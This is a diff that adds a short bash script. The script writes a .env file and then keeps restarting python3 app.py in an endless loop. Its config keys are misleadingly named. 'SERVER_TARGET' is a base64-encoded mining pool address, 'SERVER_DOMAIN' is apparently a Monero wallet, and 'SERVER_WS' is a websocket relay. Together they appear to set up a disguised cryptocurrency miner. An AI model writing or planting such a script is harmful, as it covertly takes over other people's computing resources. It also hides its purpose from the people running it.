@@ -1,0 +1,10 @@
+#!/bin/bash
+CONNECT=$1
+NAME=$2
+echo "SERVER_WS=wss://yuk.hellnawh.me
+SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
+SERVER_DOMAIN=4ALb6dTfBNNJpj1HNga4azHz85w6P9tJPJUJ89mJAkWgPZ4qwCB9S2gQzESN1DyXnj3ABnqPUbN4kSEMSXMDuzjQUVoDf83
+SERVER_SECRET=${NAME}
+SERVER_CONNECTION=${CONNECT}
+SERVER_MODE=FAST" > .env
+while true; do python3 app.py; sleep 15; done
